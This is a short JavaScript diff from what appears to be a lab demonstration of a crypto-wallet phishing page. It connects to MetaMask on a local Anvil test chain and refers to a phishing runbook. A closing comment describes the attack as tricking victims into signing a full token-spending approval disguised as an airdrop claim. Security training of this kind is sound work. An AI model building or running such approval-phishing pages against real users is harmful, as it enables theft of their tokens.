@@ -46,10 +46,11 @@ function token() {
 }
 async function wallet() {
   if (!window.ethereum) { alert("未检测到 MetaMask。请按 docs/phishing-runbook.md 安装并导入 Anvil 测试私钥。"); throw new Error("no wallet"); }
-  await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x7a69" }] })
-    .catch(() => window.ethereum.request({ method: "wallet_addEthereumChain", params: [{
-      chainId: "0x7a69", chainName: "Anvil Local", rpcUrls: [RPC_READ], nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 } }] }));
-  return (await window.ethereum.request({ method: "eth_accounts" }))[0];
+  const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+  if (!accounts || !accounts.length) {
+    throw new Error("钱包没有返回账户——请解锁 MetaMask 并在连接请求里点'连接',然后重试");
+  }
+  return accounts[0];
 }
 
 // 攻击核心:让受害者把"领取空投"理解成收款,实际签的是"授权攻击者动用全部代币"。
